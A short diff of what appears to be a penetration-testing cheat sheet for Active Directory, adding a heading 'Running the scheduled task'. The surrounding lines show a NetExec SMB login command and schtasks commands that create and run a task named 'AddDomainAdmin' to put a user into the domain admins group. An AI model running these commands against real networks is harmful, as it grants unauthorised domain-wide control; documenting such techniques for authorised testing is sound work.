@@ -1019,6 +1019,7 @@ NetExec smb <Domain_Controller_IP> -d <AD_domain> -u <AD_user> -p <AD_password> 
   schtasks /create /tn "AddDomainAdmin" /tr "net group \"domain admins\" <AD_User> /add /domain" /sc once /st 08:30 /ru "<Domain_Name\<Privilged_AD_User>"
   ```
 
+  #### Running the scheduled task
   ```Shell
   schtasks /run /tn "AddDomainAdmin"
   ```
